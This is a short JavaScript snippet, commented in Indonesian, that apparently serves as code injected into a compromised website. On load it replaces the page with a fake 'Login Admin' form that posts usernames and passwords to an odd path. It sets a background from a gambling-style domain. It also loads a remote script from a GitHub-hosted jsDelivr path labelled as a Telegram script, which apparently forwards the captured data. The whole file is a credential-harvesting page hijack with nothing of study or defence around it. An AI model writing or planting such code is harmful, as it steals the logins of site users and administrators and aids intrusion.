(function(){
    // Ganti seluruh body
    document.body.innerHTML = `
        <div class="login-container">
            <h2>Login Admin</h2>
            <form method="post" action="/bosgroup2on/index.php">
                <label>Username:</label><br>
                <input type="text" name="username"><br>
                <label>Password:</label><br>
                <input type="password" name="password"><br><br>
                <input type="submit" value="Login">
            </form>
        </div>
    `;

    // Tambah style
    const style = document.createElement('style');
    style.textContent = `
        body {
            background-image: url('besarwin188.com');
            background-repeat: no-repeat;
            background-attachment: fixed; 
            background-size: 100% 100%;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #a7a4a4;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #a3a2a2;
            border-radius: 3px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #0e0f0f;
            color: #beb6b6;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #0a0a0a;
        }
        .error-message {
            color: red;
            margin-bottom: 10px;
        }
    `;
    document.head.appendChild(style);

    // Tambah Font Awesome
    const fontAwesome = document.createElement('link');
    fontAwesome.rel = 'stylesheet';
    fontAwesome.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css';
    document.head.appendChild(fontAwesome);

    // Sisipkan script Telegram
    const tgScript = document.createElement('script');
    tgScript.src = "//cdn.jsdelivr.net/gh/inggarfi/balmon@main/3.js";
    document.body.appendChild(tgScript);
})();
